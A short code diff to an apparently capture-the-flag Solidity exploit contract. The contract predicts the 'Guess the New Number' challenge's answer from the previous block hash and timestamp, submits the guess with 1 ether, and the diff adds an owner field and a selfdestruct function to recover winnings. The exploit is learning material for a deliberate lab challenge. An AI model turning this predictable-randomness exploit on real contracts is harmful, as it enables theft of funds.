@@ -20,7 +20,9 @@ contract GuessTheNewNumberChallenge {
 }
 
 contract GuessTheNewNumberChallengeExploit {
+  address owner_;
   constructor() public payable {
+    owner_ = msg.sender;
   }
   function hack(address _target) public payable{
     uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
@@ -28,5 +30,8 @@ contract GuessTheNewNumberChallengeExploit {
     target.guess.value(1 ether)(answer);
   }
   function() public payable {
+  }
+  function destruct() public {
+    selfdestruct(owner_);
   }
 }
